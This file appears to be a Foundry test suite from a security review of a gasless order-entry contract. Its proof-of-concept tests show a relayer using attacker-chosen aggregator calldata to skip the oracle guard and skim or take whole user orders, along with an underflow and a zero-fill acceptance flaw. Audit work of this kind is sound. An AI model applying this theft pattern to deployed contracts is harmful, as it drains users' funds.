// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {ReviewBase, console2} from "./ReviewBase.sol";
import {Vm} from "forge-std/Vm.sol";
import {SkimmingAggregator} from "./Mocks.sol";
import {GaslessEntry} from "../../src/v2/GaslessEntry.sol";
import {OracleGuard} from "../../src/v2/OracleGuard.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {stdError} from "forge-std/StdError.sol";

/// R-02  HIGH  The oracle guard is not enforced on the aggregator path.
/// R-03  MEDIUM  `spent` is computed against a balance that still contains the relayer fee.
///
/// GaslessEntry's header states: "The user's `minOut` and the oracle guard are enforced on the
/// final balance either way, so a hostile or stale aggregator route degrades the price at worst
/// and cannot steal."
///
/// OracleGuard is only ever reached inside PartitioRouterV2.swapExactIn. `_fillSingle` returns at
/// `if (got >= out.minOut && spent <= spendable) return (got, true);` without touching the router,
/// so on the aggregator path the guard is never evaluated. The only remaining check is the static
/// `minOut` in the signed order - and nothing requires it to be non-zero.
///
/// The mock below models what a relayer can express in real Kyber calldata: an allowlisted
/// aggregator takes its destination address from calldata, and in GaslessEntry that calldata is
/// chosen by the relayer, never by the signer.
contract R02_AggregatorGuardBypass is ReviewBase {
    SkimmingAggregator internal agg;

    function setUp() public {
        agg = new SkimmingAggregator();
        _baseSetUp([address(agg), address(0), address(0), address(0)]);
    }

    /// minOut == 0 - which is what every shipped test in test/GaslessEntry.t.sol signs - lets the
    /// relayer keep 100% of the order. The fill SUCCEEDS; the guard is never consulted.
    function test_R02_aggregatorPathTakesEverythingWhenMinOutIsZero() public {
        uint256 amt = 1000e6;
        uint256 fee = 5e6;
        uint256 spendable = amt - fee;
        deal(USDG, user, amt);

        GaslessEntry.Order memory o = _buyOrder(amt, fee, 0, bytes32(uint256(11)));
        GaslessEntry.Auth memory a = _auth(o);
        GaslessEntry.Route memory r = GaslessEntry.Route({
            aggregator: address(agg),
            callData: abi.encodeCall(SkimmingAggregator.swap, (USDG, spendable, AAPL, 0, relayer)),
            aggMinOut: 0,
            legs: _legs1(0, spendable)
        });

        uint256 oracleValue = _oracleAapl(spendable);
        vm.prank(relayer);
        uint256[] memory outs = entry.fill(o, a, r, fee);

        console2.log("oracle says 995 USDG is worth (AAPL wei):", oracleValue);
        console2.log("user actually received (AAPL wei)       :", outs[0]);
        console2.log("relayer USDG take                       :", IERC20(USDG).balanceOf(relayer));

        assertEq(outs[0], 0, "user should have received nothing");
        assertEq(IERC20(AAPL).balanceOf(user), 0, "user got no stock");
        assertEq(IERC20(USDG).balanceOf(relayer), amt, "relayer took the entire order");
        assertEq(IERC20(USDG).balanceOf(user), 0, "user has nothing left");
        assertGt(oracleValue, 0, "oracle sanity");
    }

    /// Even with a non-zero minOut the guard is absent: the relayer hands over exactly minOut and
    /// keeps the rest, at a price the guard would reject at ANY permitted band (max 20%).
    function test_R02_skimEverythingAboveMinOutBelowAnyPermittedBand() public {
        uint256 amt = 1000e6;
        uint256 fee = 5e6;
        uint256 spendable = amt - fee;
        deal(USDG, user, amt);

        uint256 oracleValue = _oracleAapl(spendable);
        uint256 widestPermittedFloor = (oracleValue * (10_000 - 2000)) / 10_000; // MAX_DEV_BPS = 20%
        uint256 minOut = oracleValue / 100; // signer accepts 1% - a loose but non-zero floor

        deal(AAPL, address(agg), minOut);
        GaslessEntry.Order memory o = _buyOrder(amt, fee, minOut, bytes32(uint256(12)));
        GaslessEntry.Auth memory a = _auth(o);
        GaslessEntry.Route memory r = GaslessEntry.Route({
            aggregator: address(agg),
            callData: abi.encodeCall(SkimmingAggregator.swap, (USDG, spendable, AAPL, minOut, relayer)),
            aggMinOut: 0,
            legs: _legs1(0, spendable)
        });

        vm.prank(relayer);
        uint256[] memory outs = entry.fill(o, a, r, fee);

        console2.log("oracle value          :", oracleValue);
        console2.log("widest permitted floor:", widestPermittedFloor);
        console2.log("delivered             :", outs[0]);

        assertEq(outs[0], minOut, "delivered exactly minOut");
        assertLt(outs[0], widestPermittedFloor, "delivery is below the widest floor OracleGuard permits");
        assertEq(IERC20(USDG).balanceOf(relayer), spendable + fee, "relayer skimmed the difference");
    }

    /// Control: the very same shortfall on the router path is rejected by OracleGuard. This is the
    /// asymmetry - identical economics, opposite outcome, decided only by which branch ran.
    function test_R02_control_routerPathRejectsTheSameShortfall() public {
        uint256 amt = 4000e18; // dumping 4000 AAPL through one thin pool loses ~78%
        deal(AAPL, address(this), amt);
        IERC20(AAPL).approve(address(router), amt);
        vm.expectRevert(); // OracleGuard.BelowOracleFloor
        router.swapExactIn(
            AAPL,
            USDG,
            _legs1(0, amt),
            _guardSellAapl(2000), // the widest band the library allows
            0,
            address(this),
            block.timestamp + 300
        );
    }

    /// R-03: `spent = spendable - tokenIn.balanceOf(this)` is taken while the fee is still held, so
    /// it equals (consumed - fee). An aggregator call that succeeds while consuming less than the
    /// fee underflows and reverts the whole fill instead of falling back to partitio.
    function test_R03_successfulAggregatorThatConsumesNothingUnderflows() public {
        uint256 amt = 500e6;
        uint256 fee = 1e6;
        deal(USDG, user, amt);

        GaslessEntry.Order memory o = _buyOrder(amt, fee, 0, bytes32(uint256(13)));
        GaslessEntry.Auth memory a = _auth(o);
        GaslessEntry.Route memory r = GaslessEntry.Route({
            aggregator: address(agg),
            callData: abi.encodeCall(SkimmingAggregator.noop, ()),
            aggMinOut: 0,
            legs: _legs1(0, amt - fee)
        });

        vm.prank(relayer);
        vm.expectRevert(stdError.arithmeticError); // panic 0x11 in _fillSingle
        entry.fill(o, a, r, fee);
    }

    /// R-02c: with fee == 0 there is no underflow - and the branch is ACCEPTED rather than falling
    /// back, because `got >= out.minOut` is `0 >= 0`. A no-op aggregator call is recorded as a
    /// successful aggregator fill and the advertised same-transaction fallback never runs.
    function test_R02c_zeroFillIsAcceptedAsAnAggregatorFillWhenMinOutIsZero() public {
        uint256 amt = 500e6;
        deal(USDG, user, amt);

        GaslessEntry.Order memory o = _buyOrder(amt, 0, 0, bytes32(uint256(14)));
        GaslessEntry.Auth memory a = _auth(o);
        GaslessEntry.Route memory r = GaslessEntry.Route({
            aggregator: address(agg),
            callData: abi.encodeCall(SkimmingAggregator.noop, ()),
            aggMinOut: 0,
            legs: _legs1(0, amt)
        });

        vm.recordLogs();
        vm.prank(relayer);
        uint256[] memory outs = entry.fill(o, a, r, 0);

        assertEq(outs[0], 0, "nothing was bought");
        assertEq(IERC20(USDG).balanceOf(user), amt, "USDG returned as dust, so no loss here");
        // usedAggregator == true in OrderFilled proves the accept branch ran, not the fallback.
        assertTrue(_lastOrderFilledUsedAggregator(), "should have been recorded as an aggregator fill");
    }

    function _lastOrderFilledUsedAggregator() internal returns (bool used) {
        Vm.Log[] memory logs = vm.getRecordedLogs();
        bytes32 sig = keccak256("OrderFilled(address,bytes32,address,address,uint256,uint256,uint256,bool)");
        for (uint256 i = 0; i < logs.length; i++) {
            if (logs[i].topics[0] == sig) {
                (,,,, used) = abi.decode(logs[i].data, (address, uint256, uint256, uint256, bool));
            }
        }
    }

    function _guardSellAapl(uint256 bps) internal pure returns (OracleGuard.Params memory) {
        return OracleGuard.Params({feed: AAPL_FEED, stockIsInput: true, maxDevBps: bps});
    }
}
